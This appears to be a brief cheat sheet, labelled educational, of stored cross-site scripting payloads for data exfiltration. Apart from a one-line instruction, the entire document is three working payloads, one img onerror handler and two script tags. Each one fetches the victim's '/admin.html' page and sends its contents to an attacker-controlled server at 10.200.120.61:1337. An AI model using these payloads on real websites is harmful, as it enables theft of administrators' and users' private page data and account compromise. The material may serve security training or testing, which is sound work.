<h1>Stored XSS To EXfiltrate Data - FOR EDUCATIONAL PURPOSES ONLY</h1>

make a user make a GET request and send the results to your attacker controlled server:

```<img src=x onerror="fetch('/admin.html').then(r=>r.text()).then(d=>new Image().src='http://10.200.120.61:1337/?data='+encodeURIComponent(d))">```

```<script>fetch('/admin.html').then(r=>r.text()).then(data=>fetch('http://10.200.120.61:1337/?data='+encodeURIComponent(data)))</script>```

```<script>fetch('/admin.html').then(r=>r.text()).then(data=>{new Image().src='http://10.200.120.61:1337/?data='+encodeURIComponent(data)})</script>```
